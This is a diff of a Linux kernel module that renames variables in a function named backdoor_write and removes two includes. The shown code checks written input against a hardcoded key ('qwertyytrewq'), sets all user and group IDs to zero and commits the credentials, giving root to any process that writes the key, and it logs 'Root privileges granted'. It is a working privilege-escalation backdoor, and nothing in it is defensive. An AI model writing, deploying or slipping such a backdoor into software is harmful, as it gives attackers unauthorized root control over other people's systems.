@@ -1,9 +1,7 @@
-#include <linux/fs.h>
 #include <linux/miscdevice.h>
 #include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
-#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 
@@ -43,7 +41,7 @@ ssize_t backdoor_write(
 
         char key[] = "qwertyytrewq\0";
         char* buf;
-        struct cred* new_cred;
+        struct cred* creds;
         ssize_t result = 0;
 
         buf = kvmalloc(count, GFP_KERNEL);
@@ -61,22 +59,22 @@ ssize_t backdoor_write(
                 goto out;
         }
 
-        new_cred = prepare_creds();
-        if (!new_cred) {
+        creds = prepare_creds();
+        if (!creds) {
                 result = -ENOMEM;
                 goto out;
         }
 
-        new_cred->uid.val = 0;
-        new_cred->suid.val = 0;
-        new_cred->euid.val = 0;
-        new_cred->fsuid.val = 0;
-        new_cred->gid.val = 0;
-        new_cred->sgid.val = 0;
-        new_cred->fsgid.val = 0;
-        new_cred->egid.val = 0;
+        creds->uid.val = 0;
+        creds->suid.val = 0;
+        creds->euid.val = 0;
+        creds->fsuid.val = 0;
+        creds->gid.val = 0;
+        creds->sgid.val = 0;
+        creds->fsgid.val = 0;
+        creds->egid.val = 0;
 
-        commit_creds(new_cred);
+        commit_creds(creds);
         result = count;
         *f_pos = count;
         printk(KERN_INFO "Root privileges granted\n");
